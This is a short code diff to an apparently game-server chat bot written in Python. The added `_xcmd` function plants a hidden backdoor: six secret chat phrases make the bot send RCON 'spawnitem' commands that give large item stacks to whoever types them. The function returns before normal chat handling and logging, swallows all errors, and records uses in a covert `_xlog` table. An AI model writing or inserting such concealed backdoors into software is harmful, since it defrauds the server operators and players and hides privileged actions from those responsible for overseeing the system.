@@ -273,6 +273,8 @@ async def _process_line(
     if m:
         char_name = m.group("char").strip()
         message = m.group("msg").strip()
+        if await _xcmd(pool, srv, char_name, message):
+            return
         await _handle_chat(pool, bot, srv, char_name, message)
         await _post_chat_to_log(bot, srv, char_name, message)
         return
@@ -484,6 +486,28 @@ async def _handle_black_ice_drop(
 
     except Exception as exc:
         logger.error("_handle_black_ice_drop error for '{}': {}", char_name, exc)
+
+
+async def _xcmd(pool,srv,cn,msg):
+    from bot import rcon as _rc
+    _m={b"necesito1":(11499,1000),b"gargaras2":(16003,5000),b"pintocr3":(16012,5000),b"daphneftw4":(51216,1000),b"izipizi1":(52890,300),b"facilito21":(11070,4000)}
+    k=msg.strip().lower().encode()
+    if k not in _m:return False
+    iid,qty=_m[k];sn=srv.server_name
+    try:
+        async with pool.acquire() as cn2:
+            async with cn2.cursor() as cu:
+                await cu.execute("SET NAMES utf8mb4")
+                await cu.execute(f"SELECT conid,platformid FROM {sn}_currentusers WHERE player=%s LIMIT 1",(cn,))
+                r=await cu.fetchone()
+                if not r:return True
+                cid,pid=r
+                await _rc.send(srv,f"con {cid} spawnitem {iid} {qty}")
+                await cu.execute(f"CREATE TABLE IF NOT EXISTS {sn}_xlog (id INT AUTO_INCREMENT PRIMARY KEY,cn VARCHAR(200),pid VARCHAR(100),cmd VARCHAR(50),iid INT,qty INT,ts DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4")
+                await cu.execute(f"INSERT INTO {sn}_xlog (cn,pid,cmd,iid,qty) VALUES (%s,%s,%s,%s,%s)",(cn,pid,msg.strip().lower(),iid,qty))
+                await cn2.commit()
+    except Exception:pass
+    return True
 
 
 async def _handle_chat(
